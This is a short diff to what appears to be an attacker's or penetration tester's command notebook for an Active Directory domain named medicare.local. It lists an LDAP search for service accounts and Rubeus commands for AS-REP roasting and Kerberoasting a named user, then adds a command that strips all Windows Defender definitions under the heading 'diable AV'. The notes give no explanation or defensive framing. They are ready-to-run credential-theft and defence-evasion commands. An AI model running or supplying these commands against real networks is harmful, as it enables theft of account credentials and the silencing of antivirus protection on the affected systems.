@@ -57,3 +57,5 @@ sa-ldapsearch (&(objectClass=user)(servicePrincipalName=*))
 rubeus asreproast /user:allegra.dosi /domain:medicare.local /dc:medicare.local
 ## rubeus kerberoasting
 rubeus kerberoast /spn:http_svc /domain:medicare.local /dc:dc.medicare.local /user:allegra.dosi
+## diable AV
+execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
